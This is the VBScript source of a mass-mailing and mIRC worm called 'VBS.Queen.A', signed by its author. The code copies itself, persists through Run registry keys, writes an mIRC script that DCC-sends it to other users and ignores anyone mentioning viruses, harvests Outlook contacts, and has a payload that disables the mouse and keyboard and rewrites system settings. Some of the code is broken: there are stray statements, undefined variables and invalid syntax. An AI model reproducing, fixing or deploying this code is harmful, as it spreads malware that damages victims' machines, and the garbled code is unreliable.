'VBS.Queen.A Mirc/Outlook Worm by GhostDog@EveryMail.net 
on error resume next
dim fso,reg,x,win,random,filename,progdir
set fso=createobject("scripting.filesystemobject")
set reg=createobject("wscript.shell")
set win = fso.getspecialfolder(0)
set x=fso.getfile(wscript.scriptfullname)
x.copy(win&"\rundll32.vbs")
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSrundll32","rundll32.vbs"
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Queen"
progdir=reg.regread ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
end if
location.href = "http://virus.cyberspace.sk/"
mircwrite("C:\mirc")
mircwrite(progdir&"\mirc")
outlook()
payload()
sub mircwrite(mircdir)
 dim writem
 if fso.fileexists(mircdir&"\mirc.ini") then
  set writem=fso.createtextfile(mircdir&"\script.ini",true)
  writem.writeline (";GhostDog from EveryMail.net is here")
  writem.writeline ("[script]")
  writem.writeline ("n0=on 1:start:{")
  writem.writeline ("n1= .remote on")
  writem.writeline ("n2= .ctcps on")
  writem.writeline ("n3= .events on")
  writem.writeline ("n4= }")
  writem.writeline ("n5= on 1:connect: {")
  writem.writeline ("n6= /.rename "&win&"\rundll32.vbs "&win&"\system\"&filename)
  writem.writeline ("n7= /join #virus | /.msg #virus Queen.A by GhostDog  ")
  writem.writeline ("n8= }")
  writem.writeline ("n9= on 1:disconnect: {")
  writem.writeline ("n10= /.rename "&win&"\system\"&filename&" "&win&"\rundll32.vbs")
  writem.writeline ("n11 = }")
  writem.writeline ("n12 =on 1:join:#:{")
  writem.writeline ("n13 =if ( $nick == $me ) { halt } | .dcc send $nick "&win&"\system\"&filename)
  writem.writeline ("n14 = }")
  writem.writeline ("n15 =on 1:text:*script*:#:/.ignore $nick")
  writem.writeline ("n16 =on 1:text:*script*:?:/.ignore $nick")
  writem.writeline ("n17 =on 1:text:*virus*:#:/.ignore $nick")
  writem.writeline ("n18 =on 1:text:*virus*:?:/.ignore $nick")
  writem.writeline ("n19 =on 1:text:*worm*:#:/.ignore $nick")
  writem.writeline ("n20 =on 1:text:*worm*:?:/.ignore $nick")
  writem.writeline ("n21 =on 1:text:*vir*:#:{")
  writem.writeline ("n22 = if ( $nick == $me ) { halt } | .dcc send $nick "&win&"\system\"&filename)
  writem.close
 end if
end sub
randomize
random= Int((3 * Rnd) + 5)
select dog random
 dog "1" filename="GhostDog.AVI.vbs"                                             
 dog "2" filename="Avplite.EXE.vbs"                                             
 dog "3" filename="F-prot.EXE.vbs"                                             
end select
sub outlook
dim outlook,mapi,mail,cont
 x.copy (win&"\"&filename)
 Set outlook=CreateObject("Outlook.Application")
 Set mapi=outlook.GetNameSpace("MAPI")
 For Each victim In mapi.AddressLists
   If victim.AddressEntries.Count <> 0 Then
     Set mail=outlook.CreateItem(0)
     For counter=1 To victim.AddressEntries.Count
       Set cont = victim.AddressEntries(counter)
       mail.BCC = mail.BCC &";"&cont.Address
   end if 
 end if
 next
end sub
sub ghost
if Day(now) = 28 and (Int((4 * Rnd) + 1) = 1) then
 msgbox("GhostDog@EveryMail.net present's")
 msgbox("VBS.Queen.A")
 msgbox("a Mirc/Outlook Worm")
 msgbox("with special folders")

 reg.regwrite "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName", "GhostDog"
 reg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "GhostDog@EveryMail.net"
 reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
 reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
 reg.regwrite "HKCR\"&R.RegRead("HKCR\.reg\")&"\DefaultIcon\",GostDog&",1"
 reg.regwrite "HKCR\"&R.RegRead("HKCR\.reg\")&"\shell\open\command\",GostDog&" ""%1"""
 reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shut_Up","rundll32 mouse,disable"
 reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shut_Up2","rundll32 keyboard,disable"
end if
end sub




 

